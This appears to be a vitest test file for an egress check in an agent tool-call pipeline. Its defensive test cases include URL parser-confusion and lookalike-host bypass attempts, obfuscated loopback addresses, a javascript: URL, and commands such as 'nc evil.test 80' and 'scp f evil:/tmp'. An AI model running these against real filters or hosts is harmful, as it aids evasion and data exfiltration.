import type { PolicyAuditEntry } from "@pap/contracts";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { ALLOW_03, createPipelineBed, interactiveRules } from "../testing/pipeline-bed.ts";
import { egressStage, judgeUrl, urlsInString } from "./egress.ts";
import type { CallFacts } from "./pipeline.ts";
import { classifyTool } from "./tool-kind.ts";

let bed: Awaited<ReturnType<typeof createPipelineBed>>;
beforeAll(async () => {
  bed = await createPipelineBed();
});
afterAll(() => bed.dispose());

const ALLOW = ["example.com"];
const TOO_COMPLEX = "input too complex for the egress check";
const OK = "ok";
const tools = { web: { path: "/ext/web.js" } };

/** The real outcome of stage 02: a throw would end as a fail-closed entry whose stage 02 is a skip, never a match. */
async function verdictOf(tool: string, input: unknown, allow: string[] | null = ALLOW): Promise<string> {
  const h = bed.harness({
    rules: () => ({ ...interactiveRules, allowHosts: allow }),
    tools,
    stages: ALLOW_03,
  });
  const result = await h.run(tool, input);
  const entry: PolicyAuditEntry | undefined = h.entries.at(-1);
  const verdict = entry?.kind === "call" ? entry.stages.find((s) => s.stage === "02") : undefined;
  if (result === undefined) return verdict?.outcome === "pass" ? OK : `unexpected: ${verdict?.reason}`;
  return verdict?.outcome === "block"
    ? (verdict.reason ?? "")
    : `unexpected: ${entry?.kind === "call" ? entry.reason : undefined}`;
}
/** Stage 02 on its own: the audit step upstream refuses a cycle or a 2 MiB string before this stage sees them. */
function stageOf(input: unknown): string {
  const call: CallFacts = {
    event: { toolCallId: "c1", toolName: "web", input },
    kind: classifyTool("web", tools.web),
    rules: { ...interactiveRules, allowHosts: ALLOW },
    cwd: bed.cwd,
    tainted: false,
    key: "k",
    exec: false,
  };
  const verdict = egressStage(call);
  return verdict.outcome === "block"
    ? verdict.reason
    : verdict.outcome === "pass"
      ? OK
      : `unexpected: ${verdict.reason}`;
}
const judged = (url: string): string => {
  const verdict = judgeUrl(url, ALLOW);
  return verdict.ok ? OK : verdict.why;
};

describe("userinfo and parser differentials", () => {
  it.each([
    ["https://example.com@evil.test/", "credentials in URL"],
    ["https://evil.test\\@example.com/", "unreadable URL"],
    ["https://example.com%40evil.test/", "unreadable URL"],
    ["https://example.com:x@evil.test", "credentials in URL"],
    ["https://evil.test#@example.com", "web host not allowed: evil.test"],
  ])("%s", (url, expected) => {
    expect(judged(url)).toBe(expected);
  });
});

describe("lookalike hosts", () => {
  it.each([
    ["https://examp1e.com", "web host not allowed: examp1e.com"],
    ["https://example.com.evil.test", "web host not allowed: example.com.evil.test"],
    ["https://xn--exmple-cua.com", "web host not allowed: xn--exmple-cua.com"],
    ["https://EXAMPLE.com.", OK],
  ])("%s", (url, expected) => {
    expect(judged(url)).toBe(expected);
  });
});

describe("IP spellings", () => {
  it.each([
    "http://127.0.0.1",
    "http://2130706433",
    "http://0x7f.1",
    "http://[::1]",
    "http://[::ffff:7f00:1]",
  ])("%s", (url) => {
    expect(judged(url)).toBe("IP address");
  });
});

describe("blanks and controls", () => {
  it.each([
    ["https://example.com\t.evil.test", "unreadable URL"],
    ["https://exa\u200Dmple.com", "unreadable URL"],
    ["https://exa\u00A0mple.com", "unreadable URL"],
    ["https://exa\u202Emple.com", "unreadable URL"],
  ])("a whole string %j is refused", async (url, expected) => {
    expect(judged(url)).toBe(expected);
    expect(await verdictOf("web", { url })).toBe(expected);
  });
  it("trims a string and judges what is left", async () => {
    expect(await verdictOf("web", { url: " https://evil.test\n" })).toBe("web host not allowed: evil.test");
    expect(await verdictOf("web", { url: " https://example.com\n" })).toBe(OK);
  });
});

describe("schemes", () => {
  it.each([
    ["gopher://example.com", "gopher: URL"],
    ["ldap://example.com", "ldap: URL"],
    ["javascript://example.com/%0aalert(1)", "javascript: URL"],
    ["file:///x", OK],
    ["file://evil.test/x", "file: URL"],
    ["xhttps://evil.test", "xhttps: URL"],
  ])("%s", async (url, expected) => {
    expect(judged(url)).toBe(expected);
    expect(await verdictOf("web", { url })).toBe(expected);
  });
});

describe("free text", () => {
  it.each([
    ["see https://evil.test/?k=1.", "web host not allowed: evil.test"],
    ["(https://example.com)", OK],
    ["a\thttps://example.com\thttps://evil.test", "web host not allowed: evil.test"],
  ])("an MCP argument %j", async (text, expected) => {
    expect(await verdictOf("web", { text })).toBe(expected);
  });
});

describe("network clients", () => {
  it.each([
    ["curl evil.test", "host not checkable: curl"],
    ["wget -q evil.test", "host not checkable: wget"],
    ["nc evil.test 80", "host not checkable: nc"],
    ["ssh evil", "host not checkable: ssh"],
    ["dig $T.evil.test", "host not checkable: dig"],
    ["git clone git@evil:x", "host not checkable: git"],
    ["git push", "host not checkable: git"],
    ["scp f evil:/tmp", "host not checkable: scp"],
    ["/usr/bin/curl evil.test", "host not checkable: curl"],
    ["sudo env X=1 curl evil.test", "host not checkable: curl"],
    ['sh -c "wget evil.test"', "host not checkable: wget"],
    ["curl https://example.com/x", OK],
    ["curl https://example.com evil.test", OK], // documented pass: a scheme-less host next to an allowed URL
    ['git commit -m "push"', OK],
    ["rsync -a a/ b/", OK],
    ["echo curl", OK],
  ])("%s", async (command, expected) => {
    expect(await verdictOf("bash", { command })).toBe(expected);
  });
});

describe("depth and count", () => {
  const nested = (levels: number): unknown => {
    let value: unknown = "https://example.com";
    for (let i = 0; i < levels; i++) value = { a: value };
    return value;
  };
  const cycle: Record<string, unknown> = {};
  cycle.self = cycle;
  it.each([
    ["10 levels", nested(10), OK],
    ["11 levels", nested(11), TOO_COMPLEX],
    ["a cycle", cycle, TOO_COMPLEX],
    ["10 000 strings", Array.from({ length: 10_000 }, () => "x"), OK],
    ["10 001 strings", Array.from({ length: 10_001 }, () => "x"), TOO_COMPLEX],
    ["a 2 MiB JSON string", { j: `{"a":"${"x".repeat(2 * 1024 * 1024)}"}` }, TOO_COMPLEX],
    ["10 001 URLs in one string", { t: "https://example.com ".repeat(10_001) }, TOO_COMPLEX],
    ["a wide array of numbers", Array.from({ length: 100_001 }, () => 1), TOO_COMPLEX],
  ])("%s", async (_name, input, expected) => {
    expect(stageOf(input)).toBe(expected);
    if (expected === OK) expect(await verdictOf("web", input)).toBe(expected);
  });
  it("a command of too many words is blocked, not an evaluation error", async () => {
    // Stage 01 only asks about a command it cannot read (Task 8c); stage 02 still blocks it.
    expect(await verdictOf("bash", { command: "echo " + "x ".repeat(40_000) })).toBe(
      "input too complex for the egress check",
    );
  });
});

describe("long runs", () => {
  it("trims a million closing brackets in one pass", { timeout: 1000 }, () => {
    const out: string[] = [];
    urlsInString("see https://example.com/" + ")".repeat(1_000_000), out);
    expect(out).toEqual(["https://example.com/"]);
  });
  it("finds a URL after a million letters", { timeout: 1000 }, async () => {
    const text = "a".repeat(1_000_000) + " https://evil.test";
    expect(await verdictOf("web", { text })).toBe("web host not allowed: evil.test");
  });
  it("tries at most 32 scheme characters per position on a million letters", { timeout: 1000 }, () => {
    const out: string[] = [];
    urlsInString("a".repeat(1_000_000) + "://x", out);
    expect(out).toEqual(["a".repeat(32) + "://x"]);
  });
});

describe("JSON in a string", () => {
  it("parses once: a JSON string inside the JSON is text, scanned for URLs as free text", async () => {
    const inner = JSON.stringify({ u: "see https://evil.test/p" });
    const outer = JSON.stringify({ v: inner });
    expect(await verdictOf("web", { j: outer })).toBe("web host not allowed: evil.test");
    const direct: string[] = [];
    urlsInString(inner, direct);
    expect(direct).toEqual(["https://evil.test/p"]);
  });
  it("treats a brace string that is not JSON as free text", async () => {
    expect(await verdictOf("web", { j: "{ see https://evil.test/x" })).toBe(
      "web host not allowed: evil.test",
    );
  });
});

describe("no list", () => {
  it("skips the stage", async () => {
    expect(await verdictOf("web", { url: "https://evil.test" }, null)).toBe("unexpected: no egress list");
  });
});
